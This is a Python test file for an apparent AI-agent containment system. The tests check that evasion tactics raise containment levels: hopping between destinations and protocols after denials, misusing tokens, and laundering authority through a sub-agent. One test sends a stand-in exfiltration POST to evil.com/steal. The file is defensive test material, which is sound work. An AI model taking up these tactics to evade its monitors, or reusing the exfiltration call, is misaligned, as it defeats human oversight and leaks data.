"""Adversarial family: remaining §60.31 cases closed with pure-Python real components.

These cover the enumerated cases that the native-crypto guarded suites do not carry
and that were not yet exercised elsewhere: evasion-by-switching cannot escape
escalation (#104, #105), proof/token misuse and sub-agent laundering escalate
containment (#108, #109), tools must traverse the gateway (#47), a scoped egress
credential cannot reach a foreign domain (#69), a protected datastore is only
reachable use-without-disclosure (#91), and an FHE-released aggregate still passes
the Output Proxy DLP gate (#150). Every DENY is fail-closed and produces no
protected side-effect / no plaintext release. See docs/ADVERSARIAL_SUITE.md.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from cvztte.action.model import DataClassification
from cvztte.adapters.base import AdapterBinding
from cvztte.behavior import BehaviorEngine, BehaviorEvent, BehaviorEventKind, BehaviorScope
from cvztte.containment.engine import ContainmentEngine
from cvztte.decision.model import ContainmentState
from cvztte.errors import CVZTTEError, ErrorCode
from enforcement.common import DecisionEffect, InMemoryReceiptSink
from enforcement.egress_proxy import EgressConfig, EgressProxy, EgressRequest
from enforcement.mcp_gateway import MCPGateway, MCPRequest, ProtectedServer
from enforcement.message_broker import MessageBroker, MessageConfig, MessageRequest
from enforcement.output_proxy import OutputProxy, OutputRequest
from enforcement.secret_broker import SecretBroker, SecretRequest

from lab import AGENT, RUNTIME, RefValidator

BINDING = AdapterBinding(agent_id=AGENT, runtime_id=RUNTIME, session_id="ses_1")
T0 = datetime(2026, 9, 7, 12, 0, 0, tzinfo=timezone.utc)


def _subject() -> str:
    return f"{AGENT}|{RUNTIME}|ses_1"


# #104 destination switching increases evasion score and cannot evade escalation --


def test_case104_destination_switching_raises_evasion_and_escalates():
    # The behavior engine's evasion signal rises as the agent hops destinations.
    eng = BehaviorEngine()
    scope = BehaviorScope(agent_id=AGENT, session_id="ses_1", runtime_id=RUNTIME)
    for i, dest in enumerate(("a.evil.test", "b.evil.test", "c.evil.test")):
        eng.record(
            scope,
            BehaviorEvent(
                kind=BehaviorEventKind.EXECUTED, action_type="EGRESS",
                at=T0 - timedelta(seconds=10 * i), external_destination=dest, external_bytes=1,
            ),
            now=T0,
        )
    snap = eng.snapshot(scope, now=T0)
    assert snap.new_external_destination == 3  # evasion score climbs with switching

    # Switching destination after each denial does NOT reset the denial evidence,
    # so containment still escalates (evasion is defeated, not rewarded).
    ce = ContainmentEngine()
    subject = _subject()
    ce.evaluate(subject=subject, agent_id=AGENT, runtime_id=RUNTIME,
                features={"denials_60s": 3}, reason_codes=["DESTINATION_SWITCHING"])
    assert ce.state(subject) is ContainmentState.SUSPICIOUS


# #105 protocol switching after denial still accumulates and escalates ----------


def test_case105_protocol_switching_after_denial_escalates():
    ce = ContainmentEngine()
    subject = _subject()
    # Denials across switched protocols (http -> dns -> smtp) accumulate; the
    # count crosses the RESTRICTED threshold regardless of protocol rotation.
    ce.evaluate(subject=subject, agent_id=AGENT, runtime_id=RUNTIME,
                features={"denials_5m": 8}, reason_codes=["PROTOCOL_SWITCH_AFTER_DENIAL"])
    assert ce.state(subject) is ContainmentState.RESTRICTED


# #108 proof/token misuse escalates containment ---------------------------------


def test_case108_token_proof_misuse_escalates():
    ce = ContainmentEngine()
    subject = _subject()
    # Repeated Decision-Token / proof misuse is bypass evidence; it quarantines.
    t = ce.evaluate(subject=subject, agent_id=AGENT, runtime_id=RUNTIME,
                    features={"bypass_attempts_5m": 3}, reason_codes=["TOKEN_PROOF_MISUSE"])
    assert t is not None
    assert ce.state(subject) is ContainmentState.QUARANTINED


# #109 sub-agent authority laundering escalates ---------------------------------


def test_case109_sub_agent_laundering_denied_then_escalates():
    # First: the message broker refuses to launder a forged delegation (no effect).
    sink = InMemoryReceiptSink()
    broker = MessageBroker(MessageConfig(allowed_external_recipients=set()),
                           RefValidator(), sink)
    with pytest.raises(CVZTTEError) as exc:
        broker.mediate(
            MessageRequest(to_agent="agt_bob", purpose_code="task", content="do X",
                           propagate_delegation_id="dlg_forged"),
            BINDING,
        )
    assert exc.value.code is ErrorCode.MESSAGE_DENIED

    # That laundering attempt is bypass evidence that escalates containment.
    ce = ContainmentEngine()
    subject = _subject()
    ce.evaluate(subject=subject, agent_id=AGENT, runtime_id=RUNTIME,
                features={"bypass_attempts_5m": 1}, reason_codes=["SUBAGENT_LAUNDERING"])
    assert ce.state(subject) is ContainmentState.SUSPICIOUS


# #47 direct protected Tool HTTP — tools MUST traverse the gateway --------------


def test_case47_direct_protected_tool_http_denied():
    sink = InMemoryReceiptSink()
    gateway = MCPGateway(RefValidator(), sink, servers={
        "github": ProtectedServer(endpoint="https://api.github.com", credential="ghp_secret",
                                  handler=lambda tool, args, cred: {"ok": True}),
    })
    # A tool whose logical server is not the mediated one has no reachable endpoint.
    with pytest.raises(CVZTTEError) as exc:
        gateway.mediate(MCPRequest(server="direct-http", tool="fetch",
                                   arguments={"url": "https://api.github.com/user"}), BINDING)
    assert exc.value.code is ErrorCode.MCP_BYPASS_DENIED


# #69 github-scoped token used for evil.com is refused by domain allowlist ------


def test_case69_scoped_credential_cannot_reach_foreign_domain():
    sink = InMemoryReceiptSink()
    proxy = EgressProxy(
        EgressConfig(allowed_domains=frozenset({"api.github.com"})),
        RefValidator(), sink,
    )
    with pytest.raises(CVZTTEError) as exc:
        proxy.mediate(EgressRequest(url="https://evil.com/steal", method="POST"), BINDING)
    assert exc.value.code is ErrorCode.EGRESS_DENIED


# #91 direct protected DB — only reachable use-without-disclosure ---------------


def test_case91_direct_protected_db_denied_but_mediated_query_ok():
    sink = InMemoryReceiptSink()

    def db_query(secret_value, params):
        # Uses the credential internally; returns only non-secret rows.
        assert secret_value == "db-conn-pw"
        return {"rows": params.get("limit", 0)}

    broker = SecretBroker(RefValidator(), sink, secrets={"prod_db": "db-conn-pw"},
                          operations={"db_query": db_query})

    # Direct raw read of the DB credential is refused.
    with pytest.raises(CVZTTEError) as exc:
        broker.mediate(SecretRequest("prod_db", "reveal"), BINDING)
    assert exc.value.code is ErrorCode.SECRET_DISCLOSURE_FORBIDDEN

    # The mediated query works and never exposes the credential.
    out = broker.mediate(SecretRequest("prod_db", "db_query", {"limit": 5}), BINDING)
    assert "db-conn-pw" not in repr(out.receipt.__dict__)


# #150 an FHE-released aggregate still passes the Output Proxy DLP gate ----------


def test_case150_released_result_passes_output_proxy():
    sink = InMemoryReceiptSink()
    proxy = OutputProxy(RefValidator(), sink)
    # A decrypted aggregate (a plain number, no PII / credential) is releasable.
    out = proxy.mediate(OutputRequest("aggregate salary mean over 42 records: 91234"), BINDING)
    assert out.result.detail["effect"] == DecisionEffect.ALLOW.value
    assert out.receipt.outcome == "EXECUTED"
